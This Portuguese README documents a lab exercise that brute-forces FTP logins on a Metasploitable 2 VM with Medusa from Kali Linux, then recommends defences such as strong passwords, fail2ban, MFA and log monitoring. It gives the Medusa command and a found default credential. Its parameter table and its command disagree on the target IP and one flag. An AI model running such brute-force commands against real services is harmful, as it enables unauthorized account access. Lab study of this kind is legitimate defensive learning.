# Brutal-Force-FTP
Projeto prático utilizando Kali Linux e a ferramenta Medusa, em conjunto com ambientes vulneráveis Metasploitable 2 , para simular cenários de ataque de força bruta e medidas de prevenção.

# 🛡️ Medusa Brute-Force Simulation Project

Este projeto simula e documenta ataques de força bruta usando a ferramenta **Medusa** a partir do Kali Linux contra alvos vulneráveis (Metasploitable 2, com foco na documentação e mitigação.

## ⚠️ Descrição

Este material é estritamente para **fins educacionais e de estudo**. Os ataques foram executados em um ambiente de laboratório controlado. O uso destas técnicas contra sistemas sem permissão é ilegal e antiético.


## 🛠️ Ferramentas Utilizadas

* **Sistema Operacional Atacante:** Kali Linux
* **Ferramenta de Ataque:** Medusa
* **Alvos Vulneráveis:** Metasploitable 2
* **Virtualização:** Oracle VirtualBox
* **Rede:** Host-Only (192.168.56.0/24)

---

## 1. 🌐 Configuração do Ambiente de Laboratório

* **Kali Linux:** IP , `192.168.56.102`
* **Metasploitable 2:** IP  `192.168.56.101`
  
## 2. 🔍 Cenários de Ataque e Comandos

Todos os comandos e wordlists simples estão disponíveis na pasta `/attacks`.

### 2.1. Ataque de Força Bruta em FTP (Protocolo: FTP)

**Objetivo:** Obter credenciais de login FTP válidas.

| Parâmetro | Descrição |
| **-h** | IP do alvo: `192.168.56.101` |
| **-u** | Arquivo de usuários: `/attacks/wordlist-ftp.txt` |
| **-P** | Arquivo de senhas: `/attacks/wordlist-ftp.txt` |
| **-M** | Módulo de ataque: `ftp` |

**Comando Medusa (Shell Script `medusa-ftp.sh`):**

bash
medusa -h 192.168.56.20 -U attacks/wordlist-ftp.txt -P attacks/wordlist-ftp.txt -M ftp -O results/ftp-success.txt
Resultado:

Credencial Encontrada: msfadmin:msfadmin
  <img src="images/ataque.png" alt="VirtualBox_kali-linux-2024.4-virtualbox-amd64_25_11_2025_18_31_23.png" />    

  3. 🛡️ Recomendações de Mitigação
Para cada cenário de ataque, as seguintes medidas de segurança são recomendadas:

Senhas Fortes: Implementar políticas de senhas longas, complexas e únicas.

Limitação de Taxa (Rate Limiting): Configurar firewalls ou serviços para bloquear temporariamente um IP após um número X de tentativas de login falhas (e.g., usando fail2ban).

MFA (Autenticação de Múltiplos Fatores): Implementar sempre que possível para serviços críticos.

Desabilitar Serviços Não Utilizados: Desabilitar ou remover serviços legados/vulneráveis (como FTP) se não forem estritamente necessários.

Monitoramento de Logs: Monitorar logs de autenticação para identificar padrões de ataques de força bruta (tentativas massivas de login).






